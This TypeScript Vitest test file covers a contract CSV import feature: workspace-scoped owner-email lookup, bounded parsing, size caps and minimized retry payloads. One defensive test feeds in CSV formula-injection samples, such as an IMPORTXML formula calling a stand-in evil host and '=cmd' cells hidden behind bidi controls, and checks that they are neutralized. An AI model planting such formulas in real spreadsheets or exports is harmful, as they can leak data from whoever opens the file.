import { beforeEach, describe, expect, it, vi } from "vitest";

const { autoAttachProgramsForContract, emitProductTelemetryEvent, mapWithConcurrency } = vi.hoisted(() => ({
  autoAttachProgramsForContract: vi.fn(async () => ({ attachedPrograms: [] })),
  emitProductTelemetryEvent: vi.fn(async () => undefined),
  mapWithConcurrency: vi.fn(async <T>(items: T[], _concurrency: number, worker: (item: T) => Promise<unknown>) => {
    for (const item of items) await worker(item);
    return [];
  }),
}));

vi.mock("@/lib/v4/program-auto-attach", () => ({ autoAttachProgramsForContract }));
vi.mock("@/lib/product-telemetry", () => ({ emitProductTelemetryEvent }));
vi.mock("@/lib/extraction/concurrency", () => ({ mapWithConcurrency }));

import {
  MAX_IMPORT_BODY_CHARS,
  MAX_IMPORT_CSV_CELL_CHARS,
  MAX_IMPORT_CSV_ROWS,
  minimizeImportRawPayload,
  normalizeCsvImportCell,
  parseCsv,
  runContractCsvImport,
} from "@/lib/import-jobs";

function makeAdmin(ownerMembers: Array<{ user_id: string; profiles: { email: string | null } }> = []) {
  const eqLog: Array<{ table: string; col: string; val: string }> = [];
  const inLog: Array<{ table: string; col: string; vals: string[] }> = [];
  const memberRows = ownerMembers.map((member) => ({ user_id: member.user_id }));
  const profileRows = ownerMembers.map((member) => ({
    id: member.user_id,
    full_name: null,
    email: member.profiles.email,
  }));
  const contractInsert = vi.fn((rows: Record<string, unknown>[]) => ({
    select: vi.fn(async () => ({ data: rows.map((_, index) => ({ id: `contract-${index + 1}` })), error: null })),
  }));
  const jobRowsInsert = vi.fn(async () => ({ error: null }));

  const admin = {
    from: (table: string) => {
      if (table === "organization_members") {
        return {
          select: vi.fn(() => ({
            eq: vi.fn(async (col: string, val: string) => {
              eqLog.push({ table, col, val });
              return { data: memberRows, error: null };
            }),
          })),
        };
      }
      if (table === "profiles") {
        return {
          select: vi.fn(() => ({
            in: vi.fn(async (col: string, vals: string[]) => {
              inLog.push({ table, col, vals });
              return { data: profileRows.filter((profile) => vals.includes(profile.id)), error: null };
            }),
          })),
        };
      }
      if (table === "contract_import_jobs") {
        return {
          insert: vi.fn(() => ({
            select: vi.fn(() => ({ single: vi.fn(async () => ({ data: { id: "job-1" }, error: null })) })),
          })),
          update: vi.fn(() => {
            const chain = {
              eq: vi.fn(() => chain),
              then: (resolve: (value: { error: null }) => unknown) => Promise.resolve({ error: null }).then(resolve),
            };
            return chain;
          }),
        };
      }
      if (table === "contracts") return { insert: contractInsert };
      if (table === "contract_import_job_rows") return { insert: jobRowsInsert };
      throw new Error(`unexpected table ${table}`);
    },
  };

  return { admin, eqLog, inLog, contractInsert, jobRowsInsert };
}

describe("runContractCsvImport owner assignment", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("resolves owner emails through workspace membership scope", async () => {
    const { admin, eqLog, inLog, contractInsert } = makeAdmin([
      { user_id: "member-1", profiles: { email: "owner@acme.test" } },
    ]);

    const result = await runContractCsvImport({
      admin: admin as never,
      membership: { organization_id: "org-1" },
      userId: "user-1",
      rows: [{ title: "MSA", counterparty: "Acme", owner_email: "owner@acme.test" }],
    });

    expect(result).toMatchObject({ success: true, created: 1, errors: 0, jobId: "job-1" });
    expect(eqLog).toContainEqual({ table: "organization_members", col: "organization_id", val: "org-1" });
    expect(inLog).toContainEqual({ table: "profiles", col: "id", vals: ["member-1"] });
    expect(contractInsert).toHaveBeenCalledWith([
      expect.objectContaining({ organization_id: "org-1", owner_id: "member-1", created_by: "user-1" }),
    ]);
  });

  it("rejects owner emails that are not present in the workspace membership", async () => {
    const { admin, contractInsert, jobRowsInsert } = makeAdmin([]);

    const result = await runContractCsvImport({
      admin: admin as never,
      membership: { organization_id: "org-1" },
      userId: "user-1",
      rows: [{ title: "MSA", counterparty: "Acme", owner_email: "missing@acme.test" }],
    });

    expect(result).toMatchObject({ success: true, created: 0, errors: 1, jobId: "job-1" });
    expect(contractInsert).not.toHaveBeenCalled();
    expect(jobRowsInsert).toHaveBeenCalledWith([
      expect.objectContaining({
        job_id: "job-1",
        organization_id: "org-1",
        owner_email: "missing@acme.test",
        status: "error",
        error_message: "Owner email not found in workspace",
        raw_payload: expect.objectContaining({
          raw_payload_minimized: true,
          retained_for: "retry_normalized_fields",
          payload_hash_sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
          retry_fields: expect.objectContaining({
            title: "MSA",
            counterparty: "Acme",
            owner_email: "missing@acme.test",
          }),
        }),
      }),
    ]);
  });
});

describe("parseCsv malformed CSV boundaries", () => {
  it("keeps malformed quoted CSV bounded and non-throwing", () => {
    const rows = parseCsv('title,counterparty\n"unterminated,Acme\nSecond,Vendor');
    expect(rows.length).toBeGreaterThan(0);
    expect(rows.length).toBeLessThanOrEqual(2);
  });

  it("neutralizes formulas and strips bidi controls in imported cells", () => {
    expect(normalizeCsvImportCell("=IMPORTXML(\"https://evil.test\")")).toBe("'=IMPORTXML(\"https://evil.test\")");
    expect(normalizeCsvImportCell(" \u202e+cmd")).toBe("'+cmd");
    expect(parseCsv("title,counterparty\n\u202e=cmd,Vendor \u2066LLC\u2069")).toEqual([
      { title: "'=cmd", counterparty: "Vendor LLC" },
    ]);
  });

  it("caps parsed CSV rows and cells before trusted import processing", () => {
    const oversizedCell = "A".repeat(MAX_IMPORT_CSV_CELL_CHARS + 256);
    const csv = [
      "title,counterparty",
      `${oversizedCell},Vendor`,
      ...Array.from({ length: MAX_IMPORT_CSV_ROWS + 250 }, (_, index) => `MSA ${index},Acme`),
    ].join("\n");
    const rows = parseCsv(csv);
    expect(rows).toHaveLength(MAX_IMPORT_CSV_ROWS);
    expect(rows[0]?.title).toHaveLength(MAX_IMPORT_CSV_CELL_CHARS);
  });

  it("documents the import parser body ceiling", () => {
    expect(MAX_IMPORT_BODY_CHARS).toBe(2_000_000);
  });

  it("stores retry-safe minimized import payloads with TTL metadata", () => {
    const payload = minimizeImportRawPayload(
      {
        title: "\u202e=MSA",
        counterparty: "Acme",
        owner_email: "OWNER@ACME.TEST",
        external_reference_id: "ext-1",
      },
      new Date("2026-01-01T00:00:00.000Z")
    );

    expect(payload).toMatchObject({
      schema_version: 1,
      raw_payload_minimized: true,
      retained_for: "retry_normalized_fields",
      ttl_expires_at: "2026-01-31T00:00:00.000Z",
      payload_hash_sha256: expect.stringMatching(/^[a-f0-9]{64}$/),
      retry_fields: {
        title: "'=MSA",
        counterparty: "Acme",
        owner_email: "owner@acme.test",
        external_reference_id: "ext-1",
      },
    });
  });
});
